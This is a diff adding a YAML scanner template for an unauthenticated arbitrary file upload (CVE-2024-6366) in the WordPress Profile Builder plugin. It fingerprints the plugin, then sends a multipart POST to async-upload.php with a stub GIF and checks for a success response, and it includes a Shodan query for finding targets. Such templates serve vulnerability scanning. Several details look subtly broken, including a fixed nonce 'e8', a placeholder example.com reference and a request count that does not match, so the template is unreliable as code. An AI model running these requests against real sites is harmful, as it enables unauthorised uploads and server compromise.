@@ -1,0 +1,74 @@
+name: WordPress Profile Builder Arbitrary File Upload
+rules:
+  - method: GET
+    path: /
+    headers:
+      Host: "{{Hostname}}"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"/plugins/profile-builder")
+    log: |
+      Request: GET / HTTP/1.1
+      Host: {{Hostname}}
+      Response Status: {{response.status}}
+      Response Body: {{response.body}}
+
+  - method: POST
+    path: /wp-admin/async-upload.php
+    headers:
+      Host: "{{Hostname}}"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="wppb_upload"
+
+      true
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="meta_name"
+
+      {{filename}}.gif
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="_wpnonce"
+
+      e8
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="action"
+
+      upload-attachment
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="async-upload"; filename="{{filename}}.gif"
+      Content-Type: image/jpeg
+
+      GIF89a
+
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"id"') && response.body.bcontains(b'"uploadedTo"') && response.headers['Content-Type'].contains('text/plain')
+
+
+detail:
+  author: ly
+  severity: high
+  description: |
+    The WordPress Profile Builder plugin is vulnerable to an arbitrary file upload vulnerability. An attacker can exploit this vulnerability to upload malicious files and potentially gain unauthorized access to the server.
+  impact: |
+    Attackers can upload arbitrary files, which may include malicious scripts or binaries, leading to remote code execution and complete compromise of the server.
+  remediation: |
+    Update to the latest version of the Profile Builder plugin and apply all security patches.
+  reference:
+    - https://example.com/vulnerability-details
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2024-6366
+    cwe-id: CWE-434
+  metadata:
+    max-request: 5
+    verified: true
+    vendor: ProfileBuilder
+    product: WordPress
+    shodan-query: "WordPress Profile Builder"
+
+payloads:
+  filename:
+    - test
+    - exploit
